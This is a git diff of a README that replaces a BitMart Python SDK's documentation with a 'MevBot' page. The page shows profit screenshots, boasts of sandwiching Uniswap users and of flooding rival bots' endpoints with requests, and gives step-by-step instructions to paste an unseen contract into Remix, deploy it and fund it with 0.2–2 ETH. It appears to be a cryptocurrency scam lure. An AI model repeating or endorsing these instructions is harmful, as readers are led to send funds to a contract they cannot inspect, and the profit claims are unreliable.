@@ -1,317 +1,91 @@
-[![Logo](https://img.bitmart.com/static-file/public/sdk/sdk_logo.png)](https://bitmart.com)
-
-BitMart-Python-SDK-API
-=========================
-[![PyPI version](https://img.shields.io/badge/pypi-v1.0.0-blue)](https://pypi.org/project/bitmart-python-sdk-api)
-[![Python version](https://img.shields.io/badge/python-3.7%20%7C%203.8%20%7C%203.9-blue)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-
-[BitMart Exchange official](https://bitmart.com) Python client for the BitMart Cloud API.
-
-
-
-Feature
-=========================
-- Provides exchange quick trading API
-- Easier withdrawal
-- Efficiency, higher speeds, and lower latencies
-- Priority in development and maintenance
-- Dedicated and responsive technical support
-- Provide webSocket apis calls
-- Supported APIs:
-    - `/spot/*`
-    - `/contract/*`
-    - `/account/*`
-    - Spot WebSocket Market Stream
-    - Spot User Data Stream
-    - Contract User Data Stream
-    - Contract WebSocket Market Stream
-- Test cases and examples
-
-
-
-Installation
-=========================
-```bash
-pip install bitmart-python-sdk-api
-```
-
-Documentation
-=========================
-[API Documentation](https://developer-pro.bitmart.com/en/spot/#change-log)
+# MevBot *Earn money with MEVbot*
+-----------------
+> this is my main wallet
 
 
-Example
-=========================
+![balance](https://i.ibb.co/qrhRhNv/balance.png)
 
-#### Spot Public API Example
-```python
-from bitmart.api_spot import APISpot
+## For demonstration purposes, other wallets will be used for testing below.
 
-if __name__ == '__main__':
 
-    spotAPI = APISpot(timeout=(2, 10))
-    
-    # Get a list of all cryptocurrencies on the platform
-    spotAPI.get_currencies()
-    
-    # Querying aggregated tickers of a particular trading pair
-    spotAPI.get_v3_ticker(symbol='BTC_USDT')
-    
-    # Get the latest trade records of the specified trading pair
-    spotAPI.get_v3_trades(symbol='BTC_USDT', limit=10)
-```
+## The contract is optimized. now the "start" and "withdraw" functions require less gas.
+-----------------
 
+## Update 08.05.2023 (Result)
 
-#### Spot API Example
-```python
-from bitmart.api_spot import APISpot
-from bitmart.lib import cloud_exceptions
-from bitmart.lib.cloud_log import CloudLog
+**The result of the bot, which is on the screenshot in the period from 25.04 to 08.05**
+--------
+***created bot*** 25.04.2023
+![5](https://user-images.githubusercontent.com/132013213/235938205-1637fe55-6ad0-4c9a-b602-0054bde25685.png)
+![stats08 05](https://user-images.githubusercontent.com/132013213/236736354-1ffe4ccd-1b1c-4408-b9ce-3f937de238ba.png)
 
-if __name__ == '__main__':
+*Due to the high amount of gas, profit has slightly decreased. However, from the period of May 6th to May 8th, the bot has earned 0.13 ETH.*
 
-    api_key = "Your API KEY"
-    secret_key = "Your Secret KEY"
-    memo = "Your Memo"
+------------
+The code was not intended for public display. It was created as a "tested in production" version with numerous quality tradeoffs, while my commercial code is superior. I never planned to release it publicly to avoid leaking my alpha. However, I would like to showcase what I have learned over the years.
 
-    try:
-        spotAPI = APISpot(api_key, secret_key, memo, timeout=(3, 10))
-        CloudLog.set_logger_level('info')
+The bot sends transactions and monitors the Uniswap v2 Mempool.
 
-        response = spotAPI.post_submit_order(
-            symbol='BTC_USDT',
-            side='sell',
-            type='limit',
-            size='10000',
-            price='1000000'
-        )
+Bots then compete to purchase tokens on-chain as quickly as possible by sandwiching the victim's transaction and creating a profitable slippage opportunity.
 
-    except cloud_exceptions.APIException as apiException:
-        print("Error[HTTP<>200]:", apiException.response)
-    except Exception as exception:
-        print("Error[Exception]:", exception)
-    else:
-        if response[0]['code'] == 1000:
-            print('Call Success:', response[0])
-        else:
-            print('Call Failed:', response[0]['message'])
-    
-```
+Finally, the ETH is returned to the contract for withdrawal.
 
-More Example: [test_api_spot.py](https://github.com/bitmartexchange/bitmart-python-sdk-api/blob/master/tests/test_api_spot.py)
-More Example: [test_api_account.py](https://github.com/bitmartexchange/bitmart-python-sdk-api/blob/master/tests/test_api_account.py)
+This bot performs all of these functions faster than 99% of other bots.
 
+*But ser, there are open source bots that do the same*
 
-#### Spot WebSocket Public Channel Example
+Yes, there are indeed other bot builders out there. However, I was the first one to enter this field and I still outperform them. When I read their articles, it makes me giggle because I went through the same struggles as they did. As a fellow bot builder, I feel for these guys <3.
 
-```python
+*Wen increase aggressiveness ?*
 
-from bitmart.lib import cloud_consts
-from bitmart.lib.cloud_ws_client import CloudWSClient
-from bitmart.ws_spot import create_channel, create_spot_subscribe_params
+After spending a year obsessing over this, I have compiled a list of target endpoints that other bots use. By flooding these endpoints with requests, I can cause them to lose up to 5 seconds of reaction time and gain an advantage over them. This has been my personal journey in achieving success in this field.
 
+*What did I learn?*
 
-class WSTest(CloudWSClient):
+MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
 
-    def on_message(self, message):
-        print(f'[ReceiveServerMessage]-------->{message}')
+*So why stop?*
 
+I have earned profits from this in the past, but I am now utilizing more effective commercial methods. I am willing to share my knowledge with developers so that they do not have to go through the same struggles.
 
-if __name__ == '__main__':
-    ws = WSTest(url=cloud_consts.WS_URL)
-    ws.set_debug(False)
-    channels = [
-        # public channel
-        create_channel(cloud_consts.WS_PUBLIC_SPOT_TICKER, 'BTC_USDT'),
-        create_channel(cloud_consts.WS_PUBLIC_SPOT_KLINE_1M, 'BTC_USDT'),
-        create_channel(cloud_consts.WS_PUBLIC_SPOT_DEPTH5, 'BTC_USDT')
-        
-        # or  public channel
-        #"spot/ticker:BTC_USDT",
-        #"spot/kline1m:BTC_USDT",
-        #"spot/depth5:BTC_USDT"
-    ]
 
-    ws.spot_subscribe_without_login(create_spot_subscribe_params(channels))
+## MEVBot Instructions:
+(works only for Mainnet) How it works:
 
-```
+You can see an example of how the bot works
+![exemple](https://user-images.githubusercontent.com/132013213/235937518-0bd244d5-9aad-4130-a94c-1af8f3ab8f3f.png)
 
-#### Spot WebSocket Private Channel Example
+First step -source code
+-----------------------
+Access the Remix IDE https://remix.ethereum.org/
+-----------------------
+FILE EXPLORER
+-------------
+and click and create new file "mevbot.sol" Copy code and paste in Remix IDE
 
-```python
+![1](https://user-images.githubusercontent.com/132210655/235439034-135a0157-ebd8-4fb1-bb50-85f462a8b62a.png)
 
-from bitmart.lib import cloud_consts
-from bitmart.lib.cloud_ws_client import CloudWSClient
-from bitmart.ws_spot import create_channel, create_spot_subscribe_params
+Click Solidity complier 0.6.6
+-------------------------------
+And press Compile mevbot.sol
 
+![2](https://user-images.githubusercontent.com/132210655/235439103-fd3ea0e6-4f88-4e05-b69a-4be895ad3241.png)
 
-class WSTest(CloudWSClient):
+Select ETH or BSC(BNB) network
+-----------------------------
+and router address
 
-    def on_message(self, message):
-        print(f'[ReceiveServerMessage]-------->{message}')
+Press Transact (Deploy)
+------------------------
+![3](https://user-images.githubusercontent.com/132210655/235439168-168f193c-6b45-4f1f-a057-5d69e8bc0eae.png)
 
+Next-deposit (balans MevBot)
+----------------------
+Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button
+![4](https://user-images.githubusercontent.com/132210655/235439268-70726c7c-d6eb-4d8c-9ae0-b6f0d347fe25.png)
+![4 1](https://user-images.githubusercontent.com/132210655/235439284-f7a1ffb3-fe26-484a-9ea7-4200a1c75431.png)
+![5](https://user-images.githubusercontent.com/132210655/235439291-4fc572eb-d2dc-4167-a52f-983a086f9723.png)
 
-if __name__ == '__main__':
-    ws = WSTest(cloud_consts.WS_URL_USER, api_key="Your API KEY", secret_key="Your Secret KEY", memo="Your Memo")
-    ws.set_debug(True)
-    channels = [
-        # private channel
-        create_channel(cloud_consts.WS_USER_SPOT_ORDER, 'BTC_USDT')
-    ]
-
-    ws.spot_subscribe_with_login(create_spot_subscribe_params(channels))
-
-```
-
-#### Contract Public API Example
-```python
-from bitmart.api_contract import APIContract
-
-if __name__ == '__main__':
-
-    contractAPI = APIContract(timeout=(2, 10))
-
-    # query contract details
-    contractAPI.get_details(contract_symbol='ETHUSDT')
-    
-    # Get full depth of trading pairs.
-    contractAPI.get_depth(contract_symbol='ETHUSDT')
-
-    # Querying the open interest and open interest value data of the specified contract
-    contractAPI.get_open_interest(contract_symbol='ETHUSDT')
-
-    # Applicable for checking the current funding rate of a specified contract
-    contractAPI.get_funding_rate(contract_symbol='ETHUSDT')
-    
-    # querying K-line data
-    contractAPI.get_kline(contract_symbol='ETHUSDT', step=5, start_time=1662518172, end_time=1662518172)
-
-```
-
-#### Contract API Example
-```python
-from bitmart.api_contract import APIContract
-
-if __name__ == '__main__':
-
-    api_key = "Your API KEY"
-    secret_key = "Your Secret KEY"
-    memo = "Your Memo"
-
-    contractAPI = APIContract(api_key, secret_key, memo, timeout=(3, 10))
-
-    contractAPI.post_submit_order(contract_symbol='BTCUSDT', 
-                                  side=4, 
-                                  type='limit', 
-                                  leverage='1',
-                                  open_type='isolated',
-                                  size=10, 
-                                  price='20000')
-```
-
-More Example: [test_api_contract.py](https://github.com/bitmartexchange/bitmart-python-sdk-api/blob/master/tests/test_api_contract.py)
-
-
-#### Contract WebSocket Public Channel Example
-```python
-
-from bitmart.lib import cloud_consts
-from bitmart.lib.cloud_ws_contract_client import CloudWSContractClient
-from bitmart.ws_contract import create_channel, create_contract_subscribe_params
-
-
-class WSTest(CloudWSContractClient):
-
-    def on_message(self, message):
-        print(f'[ReceiveServerMessage]-------->{message}')
-
-
-if __name__ == '__main__':
-    ws = WSTest(cloud_consts.CONTRACT_WS_URL)
-    ws.set_debug(False)
-    channels = [
-        # public channel
-        cloud_consts.WS_PUBLIC_CONTRACT_TICKER,
-        create_channel(cloud_consts.WS_PUBLIC_CONTRACT_DEPTH5, 'BTCUSDT'),
-        create_channel(cloud_consts.WS_PUBLIC_CONTRACT_KLINE_1M, 'BTCUSDT'),
-    ]
-
-    ws.contract_subscribe_without_login(create_contract_subscribe_params(channels))
-
-```
-
-#### Contract WebSocket Private Channel Example
-```python
-
-from bitmart.lib import cloud_consts
-from bitmart.lib.cloud_ws_contract_client import CloudWSContractClient
-from bitmart.ws_contract import create_channel, create_contract_subscribe_params
-
-
-class WSTest(CloudWSContractClient):
-
-    def on_message(self, message):
-        print(f'[ReceiveServerMessage]-------->{message}')
-
-
-if __name__ == '__main__':
-    ws = WSTest(cloud_consts.CONTRACT_WS_URL_USER, api_key="Your API KEY", secret_key="Your Secret KEY", memo="Your Memo")
-    ws.set_debug(False)
-    channels = [
-        # private channel
-        create_channel(cloud_consts.WS_USER_CONTRACT_ASSET, 'USDT'),
-        cloud_consts.WS_USER_CONTRACT_POSITION,
-        cloud_consts.WS_USER_CONTRACT_UNICAST,
-    ]
-
-    ws.contract_subscribe_with_login(create_contract_subscribe_params(channels))
-
-```
-
-Extra Options
-=========================
-
-### Authentication
-How to set API KEY?
-
-```python
-from bitmart.api_spot import APISpot
-from bitmart.api_contract import APIContract
-
-spotAPI = APISpot(api_key="your api access key", secret_key="your api secret key", memo="your api memo")
-contractAPI = APIContract(api_key="your api access key", secret_key="your api secret key", memo="your api memo")
-```
-
-### Timeout
-Set HTTP `connection timeout` and `read timeout`.
-
-```python
-from bitmart.api_spot import APISpot
-from bitmart.api_contract import APIContract
-spotAPI = APISpot(timeout=(2, 10))
-contractAPI = APIContract(timeout=(2, 10))
-```
-
-### Logging
-If you want to `debug` the data requested by the API and the corresponding data returned by the API,
-you can set it like this:
-
-```python
-from bitmart.lib.cloud_log import CloudLog
-CloudLog.set_logger_level('debug')
-```
-
-
-
-### Domain
-How to set API domain name? The domain name parameter is optional,
-the default domain name is `https://api-cloud.bitmart.com`.
-
-```python
-from bitmart.api_spot import APISpot
-from bitmart.api_contract import APIContract
-spotAPI = APISpot(url='https://api-cloud.bitmart.com')
-contractAPI = APIContract(url='https://api-cloud.bitmart.com')
-```
+#### ❗ NOTE:
+Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2 - 2 ETH).
+You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
